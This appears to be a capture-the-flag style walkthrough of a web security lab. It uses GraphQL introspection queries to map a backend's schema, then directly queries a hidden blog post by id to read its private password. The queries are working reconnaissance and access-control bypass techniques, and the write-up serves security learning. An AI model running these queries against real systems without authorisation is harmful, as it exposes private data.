---
description: >-
  The blog page for this lab contains a hidden blog post that has a secret
  password. To solve the lab, find the hidden blog post and enter the password.
---

# Lab: Accessing private GraphQL posts

Capture The Traffic In Burpsuite and We Got graphql endpoint  Send it into repeater tab !!

<figure><img src="../../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

For instance, we can identify all GraphQL types supported by the backend using the following query:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

```

<figure><img src="../../../.gitbook/assets/image (486).png" alt=""><figcaption></figcaption></figure>

Knowing all supported queries helps us identify potential attack vectors that we can use to obtain sensitive information. Lastly, we can use the following "general" introspection query that dumps all information about types, fields, and queries supported by the backend:

```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description

          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description

      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

<figure><img src="../../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

Then I Use This Website For Visualization the Query !!

{% embed url="https://apis.guru/graphql-voyager/" %}

<figure><img src="../../../.gitbook/assets/image (488).png" alt=""><figcaption></figcaption></figure>

We Have a Two Query !!

<figure><img src="../../../.gitbook/assets/image (489).png" alt=""><figcaption></figcaption></figure>

Then We Create a Query For enumerate The GraphQl and We Got 4 id but number 3 id is missing it's mean there is something hidden !!

```
{
getALLBlogPosts{
    id
    isPrivate
    postPassword
   }
}
```

<figure><img src="../../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

Then We Use This Query and Dump The Data and We Got The Password !!

```graphql
{
   getBlogPost(id:3){
      id
      isPrivate
      postPassword
   }
}
```

<figure><img src="../../../.gitbook/assets/image (491).png" alt=""><figcaption></figcaption></figure>

Submit The Password Here !!

<figure><img src="../../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

We Solve The Lab !!

<figure><img src="../../../.gitbook/assets/image (494).png" alt=""><figcaption></figcaption></figure>
